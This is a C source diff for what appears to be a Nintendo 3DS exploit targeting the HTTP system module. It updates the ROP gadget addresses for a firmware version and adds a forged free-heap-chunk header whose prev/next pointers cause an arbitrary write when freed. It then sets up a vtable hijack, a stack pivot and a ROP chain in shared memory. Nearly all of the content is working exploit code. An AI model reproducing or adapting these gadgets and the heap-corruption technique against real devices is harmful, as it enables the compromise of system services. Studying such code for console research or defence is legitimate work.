@@ -7,6 +7,8 @@
 #include <unistd.h>
 #include <3ds.h>
 
+#include <common_errors.h>
+
 #include "config.h"
 
 extern vu32 *httpheap_sharedmem;
@@ -17,14 +19,14 @@ extern u32 *http_codebin_buf32;
 extern u32 http_codebin_size;
 
 u32 ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8 = 0x0010264c;//Load r4 from r5+0x1b8 and r6 from r5+0x1bc. Set r0 to r4. Load the vtable addr + funcptr using just r1 and blx to r1(vtable funcptr +8).
-u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114b30;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
+u32 ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 = 0x00114d14;//Load ip from r0+0(vtable ptr). Load r1 from r4+0xc, r2 from r4+0x14, and r3 from r4+0x4. Then load ip from ip+0x18(vtable+0x18) and blx to ip.
 u32 ROP_STACKPIVOT = 0x00107b08;//Add sp with r3 then pop-pc.
 
-u32 ROP_POPPC = 0x00100208;//"pop {pc}"
+u32 ROP_POPPC = 0x00100208;//"pop {pc}"  //10ad00
 
 u32 ROP_POPR4R5R6PC = 0x00100248;//"pop {r4, r5, r6, pc}"
 
-u32 ROP_POPR1PC = 0x0010cf64;//"pop {r1, pc}"
+u32 ROP_POPR1PC = 0x0010cfcc;//"pop {r1, pc}"
 u32 ROP_POPR3PC = 0x00106a28;//"pop {r3, pc}"
 
 u32 ROP_LDRR0R1 = 0x00101c64;//Load r0 from r1, then bx-lr.
@@ -32,7 +34,7 @@ u32 ROP_STRR0_R1x4 = 0x00101c8c;//Store r0 to r1+4, then bx-lr.
 
 u32 ROP_MVNR0VAL0_BXLR = 0x001074bc;
 
-u32 ROP_BLXR3_ADDSP12_POPPC = 0x00119438;//"blx r3" "add sp, sp, #12" "pop {pc}"
+u32 ROP_BLXR3_ADDSP12_POPPC = 0x0011961c;//"blx r3" "add sp, sp, #12" "pop {pc}"
 
 u32 ROP_STRR7_R5x48_POPR4R5R6R7R8PC = 0x00102430;//Write r7 to r5+0x48. "pop {r4, r5, r6, r7, r8, pc}"
 
@@ -41,13 +43,13 @@ u32 ROP_POP_R4R5R6R7R8R9SLFPIPPC = 0x00102e10;//"pop {r4, r5, r6, r7, r8, r9, sl
 u32 ROP_PUSHR42IPLR_CMPR0_RETURN = 0x00102d08;
 u32 ROP_PUSHR42IPLR_CMPR0_RETURN_STATEPTR = 0x0011c31c;
 
-u32 ROP_ADDR0IP = 0x0010bc2c;//r0+= ip, bx-lr.
+u32 ROP_ADDR0IP = 0x0010bc94;//r0+= ip, bx-lr.
 
 u32 ROP_MOVR0R4_POPR4PC = 0x00100698;//"mov r0, r4" "pop {r4, pc}"
 
-u32 ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP = 0x0010f9f0;//"mov r3, r0" "mov r2, r0" "mov r1, r0" "blx ip"
+u32 ROP_MOVR3R0_MOVR2R0_MOVR1R0_BLXIP = 0x0010fa58;//"mov r3, r0" "mov r2, r0" "mov r1, r0" "blx ip"
 
-u32 ROP_BLXIP_POPR3PC = 0x00118c08;//"blx ip" "pop {r3, pc}"
+u32 ROP_BLXIP_POPR3PC = 0x00118dec;//"blx ip" "pop {r3, pc}"
 
 u32 ROP_ADDSPx3C_POPPC = 0x00100204;//sp+=0x3c, then pop-pc.
 
@@ -55,32 +57,32 @@ u32 ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC = 0x00109148;
 
 u32 ROP_MOVR0_VAL0_BXLR = 0x00104e20;//r0=0x0, bx-lr.
 
-u32 ROP_CMPR0R1_OVERWRITER0_BXLR = 0x00118400;//"cmp r0, r1" On mismatch r0 is set to data from .pool, otherwise r0=0. Then bx-lr.
+u32 ROP_CMPR0R1_OVERWRITER0_BXLR = 0x001185e4;//"cmp r0, r1" On mismatch r0 is set to data from .pool, otherwise r0=0. Then bx-lr.
 
-u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119a24;//"beq <addr of bx-lr>" Otherwise, ip = *r0(vtable ptr), ip = *(ip+0xcc), then bx ip.
+u32 ROP_CONDEQ_BXLR_VTABLECALL = 0x00119c08;//"beq <addr of bx-lr>" Otherwise, ip = *r0(vtable ptr), ip = *(ip+0xcc), then bx ip.
 
 u32 ROP_strncmp = 0x001064dc;
-u32 ROP_strncpy = 0x0010dc88;
-u32 ROP_memcpy = 0x0010d274;
-u32 ROP_strlen = 0x0010f848;
+u32 ROP_strncpy = 0x0010dcf0;
+u32 ROP_memcpy = 0x0010d2dc;
+u32 ROP_strlen = 0x0010f8b0;
 u32 ROP_svcControlMemory = 0x00100770;
 
 u32 ROP_svc32 = 0x00100cbc;//"ldr r0, [r0]" "svc 0x00000032" <check if r0 is positive via r1, then r0=cmdreply resultcode if so> "pop {r4, pc}"
 
 u32 ROP_CloseHandle = 0x00104698;//"push {r4, lr}" r4=r0. if((handle = *r0)){<svcCloseHandle with handle>; *r4 = 0;} return r4 + pop {r4, pc}
 
-u32 ROP_CreateContext = 0x0011689c;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
-u32 ROP_HTTPC_CMDHANDLER_CreateContext = 0x00114b4c;//This is the start of the code in the httpc_cmdhandler which handles the CreateContext cmd, starting with "ldr r7, =<cmdhdr>".
-u32 ROP_HTTPC_CMDHANDLER_AddRequestHeader = 0x00114f40;//Same as ROP_HTTPC_CMDHANDLER_CreateContext except for AddRequestHeader.
-u32 ROP_HTTPC_CMDHANDLER_AddPostDataAscii = 0x00114fc0;//Same as ROP_HTTPC_CMDHANDLER_CreateContext except for AddPostDataAscii.
+u32 ROP_CreateContext = 0x00116a80;//This is the actual CreateContext function called via the *(obj+16) vtable. inr0=_this inr1=urlbuf* inr2=urlbufsize inr3=u8 requestmethod insp0=u32* out contexthandle
+u32 ROP_HTTPC_CMDHANDLER_CreateContext = 0x00114d30;//This is the start of the code in the httpc_cmdhandler which handles the CreateContext cmd, starting with "ldr r7, =<cmdhdr>".
+u32 ROP_HTTPC_CMDHANDLER_AddRequestHeader = 0x00115124;//Same as ROP_HTTPC_CMDHANDLER_CreateContext except for AddRequestHeader.
+u32 ROP_HTTPC_CMDHANDLER_AddPostDataAscii = 0x001151a4;//Same as ROP_HTTPC_CMDHANDLER_CreateContext except for AddPostDataAscii.
 
-u32 ROP_HTTPC_CMDHANDLER_RETURN = 0x00114bf4;//Code to jump to in httpc_cmdhandler for returning from that function.
+u32 ROP_HTTPC_CMDHANDLER_RETURN = 0x0011505c;//Code to jump to in httpc_cmdhandler for returning from that function.
 
-u32 ROP_HTTPC_CMDHANDLER_FUNCRETURNADDR_MAINTHREAD = 0x0010eb9c;//Saved LR for httpc_cmdhandler when called from the main thread.
+u32 ROP_HTTPC_CMDHANDLER_FUNCRETURNADDR_MAINTHREAD = 0x0010ec04;//Saved LR for httpc_cmdhandler when called from the main thread. 
 
 u32 ROP_sharedmem_create = 0x001045a4;
 
-u32 ROP_http_context_getctxptr = 0x0010b8d8;//inr0=_this inr1=contexthandle
+u32 ROP_http_context_getctxptr = 0x0010b940;//inr0=_this inr1=contexthandle
 
 u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
 
@@ -686,6 +688,15 @@ void init_reqoverride_list(targeturl_requestoverridectx *first, targeturl_reques
 	}
 }
 
+typedef struct HeapChunk {
+    u16 magic;
+    u16 leftNeighborOffset;
+    u32 size;
+    struct HeapChunk *chainPrev;
+    struct HeapChunk *chainNext;
+    u8 data[];
+} HeapChunk;
+
 Result init_hax_sharedmem(u32 *tmpbuf)
 {
 	u32 sharedmembase = 0x10006000;
@@ -698,6 +709,9 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	u32 *ropchain_ret2http = &tmpbuf[0xfd0>>2];
 	u32 ret2http_vaddr = sharedmembase+0xfd0;
+	u32 a,b;
+	
+	#define MAGIC_FREE_CHUNK        0x4652 // "FR" (free)
 
 	u32 closecontext_stackframe = 0x0011d398;//This is the stackframe address for the actual CloseContext function.
 
@@ -715,15 +729,33 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 
 	//Overwrite the prev/next memchunk ptrs in the CTRSDK freemem memchunkhdr following the allocated struct for the POST data.
 	//Once the free() is finished, object_addr will be written to target_overwrite_addr, etc.
-	tmpbuf[0x44>>2] = target_overwrite_addr - 0xc;
-	tmpbuf[0x48>>2] = object_addr;
+	//tmpbuf[0x44>>2] = target_overwrite_addr - 0xc;
+	//tmpbuf[0x48>>2] = object_addr;
+	a=target_overwrite_addr - 0xc;
+	b=object_addr;
+	
+	HeapChunk victimChunk = {
+		.magic = MAGIC_FREE_CHUNK,
+		.leftNeighborOffset = 0,
+		.size = 0xFB4,
+		.chainPrev = (HeapChunk *)a,
+		.chainNext = (HeapChunk *)b,
+	};
+	
+	memcpy((u8 *)tmpbuf + 0x3C, &victimChunk, 0x10);
+	//u32 *shared_target=(u32*)object_addr;
+	//shared_target[0] = 0x44444444;
+	//shared_target[1] = 0x88888888;
+	
+	
+	
 
 	//Once http-sysmodule returns into the actual-CloseContext-function, r5 will be overwritten with object_addr. Then it will eventually call vtable funcptr +4 with this object. Before doing so this CloseContext function will write val0 to the two words @ obj+8 and obj+4.
 
 	initialhaxobj[0] = object_addr+0x100;//Set the vtable to sharedmem+0x300.
 	initialhaxobj[1] = object_addr+4;//Set obj+4 to the addr of obj+4, so that most of the linked-list code is skipped over.
 	tmpbuf[(0x300+4) >> 2] = ROP_LDRR4R6_R5x1b8_OBJVTABLECALLx8;//Set the funcptr @ vtable+4. This where the hax initially gets control of PC. Once this ROP finishes it will jump to ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18 below.
-
+	
 	initialhaxobj[0x1b8>>2] = object_addr+0x200;//Set the addr of haxobj1 to sharedmem+0x400(this object is used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8).
 
 	haxobj1[0] = sharedmembase+0x500;
@@ -735,9 +767,21 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	//Init the vtable for haxobj1.
 	tmpbuf[(0x500+8) >> 2] = ROP_LDRR1_R4xc_LDRR2_R4x14_LDRR4_R4x4_OBJVTABLECALLx18;//Init the funcptr used by ROPGADGET_LDRR4R5_R5x1b8_OBJVTABLECALLx8. Once this ROP finishes it will jump to ROP_STACKPIVOT.
 	tmpbuf[(0x500+0x18) >> 2] = ROP_STACKPIVOT;//Stack-pivot to sharedmem+0x520.
-
+	
+	/*
+	u32 *testsp=(u32*)sharedmembase;
 	//Setup the actual ROP-chain.
-
+	testsp[0x520>>2]=ROP_POPPC;
+	testsp[0x524>>2]=ROP_POPPC;
+	testsp[0x528>>2]=0x44444444;
+	
+	tmpbuf[0x520>>2]=ROP_POPPC;
+	tmpbuf[0x524>>2]=ROP_POPPC;
+	tmpbuf[0x528>>2]=0x44444444;
+	*/
+	
+	
+	//return 0;
 	//Write the current r7 value which isn't corrupted yet, to the ret2http ROP.
 	ropgen_popr4r5r6pc(&ropchain, &http_ropvaddr, 0, ret2http_vaddr + 0x10 - 0x48, 0);
 	ropgen_addword(&ropchain, &http_ropvaddr, ROP_STRR7_R5x48_POPR4R5R6R7R8PC);
@@ -853,7 +897,7 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	if(http_ropvaddr > sharedmembase+0xfd0)
 	{
 		printf("http_ropvaddr is 0x%08x-bytes over the limit.\n", (unsigned int)(http_ropvaddr - (sharedmembase+0xfd0)));
-		return -2;
+		return RES_ROP_TOO_LARGE;
 	}
 
 	regs[7] = 0x0011c418;//Set fp to the original value.
@@ -921,7 +965,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	if(first_targeturlctx==NULL)
 	{
 		printf("setuphaxx_httpheap_sharedmem(): The input list is empty.\n");
-		return -9;
+		return RES_NO_DATA;
 	}
 
 	mainrop_endaddr = ropvmem_base + ropvmem_size;
@@ -987,7 +1031,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	if(ropvaddr-ropvmem_base > ropoffset)
 	{
 		printf("The initial ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - ropoffset));
-		return -2;
+		return RES_ROP_TOO_LARGE;
 	}
 
 	//Create a backup of the above ROP.
@@ -998,7 +1042,7 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	if(roplaunch_bakaddr+roplaunch_baksize - ropvmem_base > ropoffset)
 	{
 		printf("The initial backup ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(roplaunch_bakaddr+roplaunch_baksize - ropvmem_base - ropoffset));
-		return -2;
+		return RES_ROP_TOO_LARGE;
 	}
 
 	ropchain = (u32*)&ropvmem_sharedmem[bakropoff>>2];
@@ -1606,14 +1650,14 @@ Result setuphaxx_httpheap_sharedmem(targeturlctx *first_targeturlctx)
 	if(ropvaddr-ropvmem_base > bakropoff)
 	{
 		printf("The main ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr-ropvmem_base - bakropoff));
-		return -2;
+		return RES_ROP_TOO_LARGE;
 	}
 
 	ropvaddr = ropvaddr - ropoffset + bakropoff;
 	if(ropvaddr > mainrop_endaddr)
 	{
 		printf("The backup version of the main ROP-chain in ropvmem is 0x%08x-bytes too large.\n", (unsigned int)(ropvaddr - mainrop_endaddr));
-		return -2;
+		return RES_ROP_TOO_LARGE;
 	}
 
 	//Setup the object used by ropgen_cond_callfunc().
